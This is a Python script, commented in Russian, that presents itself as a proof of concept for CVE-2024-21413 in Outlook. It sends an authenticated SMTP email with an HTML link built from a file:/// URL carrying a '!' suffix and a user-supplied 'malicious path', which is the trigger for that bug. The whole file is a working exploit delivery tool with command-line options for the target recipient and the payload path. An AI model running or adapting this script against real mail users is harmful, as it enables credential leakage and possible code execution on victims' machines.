import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import argparse
import sys


# В этот цикл мы передаем все необходимые аргументы для доставки сообщения получателю
def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):
    msg = MIMEMultipart('alternative')  # Контейнер для хранения HTML-кода и текста
    msg['Subject'] = subject  # Тема письма
    msg['From'] = sender_email  # Отправитель письма
    msg['To'] = recipient_email  # Получатель письма

    text = "Please read this email in HTML format."
    # Ниже находится сам баг, указываем все, что хотим запустить до знака !
    html = f"""\
    <html>
    <body>
        <h1><a href="file:///{link_url}!subject">CVE-2024-21413 PoC.</a></h1>  
    </body>
    </html>
    """

    part1 = MIMEText(text, 'plain')  # Передаем контейнеру тип данных
    part2 = MIMEText(html, 'html')
    msg.attach(part1)  # Собираем сообщение в одно
    msg.attach(part2)

    try:  # Здесь мы перехватываем ошибки и выводим их в консоль
        with smtplib.SMTP(smtp_server, port) as server:  # Подключаемся к серверу
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(username, password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")


def main():  # Здесь находятся необходимые аргументы для работы эксплоита
    parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
    parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
    parser.add_argument('--port', type=int, default=587, help="SMTP server port")
    parser.add_argument('--username', required=True, help="SMTP server username for authentication")
    parser.add_argument('--password', required=True, help="SMTP server password for authentication")
    parser.add_argument('--sender', required=True, help="Sender email address")
    parser.add_argument('--recipient', required=True, help="Recipient email address")
    parser.add_argument('--url', required=True, help="Malicious path to include in the email")
    parser.add_argument('--subject', required=True, help="Email subject")

    args = parser.parse_args()

    send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url,
               args.subject)    # Отправляем письмо используя перечисленные аргументы


if __name__ == "__main__":
    if len(sys.argv) == 1:
        sys.exit(1)
    main()
